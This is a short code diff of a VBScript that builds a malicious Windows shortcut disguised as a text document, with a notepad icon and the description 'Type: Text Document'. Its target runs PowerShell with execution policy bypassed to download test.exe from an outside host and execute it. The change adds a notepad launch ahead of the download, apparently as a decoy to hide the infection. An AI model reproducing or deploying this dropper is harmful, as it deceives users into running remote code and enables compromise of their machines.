@@ -6,7 +6,7 @@ unicodeName = "unicode.lnk"
 shortcutPath = DesktopPath & "\" & unicodeName
 Set lnk = WshShell.CreateShortcut(shortcutPath)
 lnk.TargetPath = "powershell.exe"
-lnk.Arguments =  "-ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://illmob.org/test.exe','test.exe');./test.exe;"
+lnk.Arguments =  "-ExecutionPolicy Bypass -noLogo -Command  notepad.exe;(new-object System.Net.WebClient).DownloadFile('http://illmob.org/test.exe','test.exe');./test.exe;"
 lnk.IconLocation = "c:\windows\system32\notepad.exe"
 lnk.Description = "Type: Text Document"
 lnk.Save()
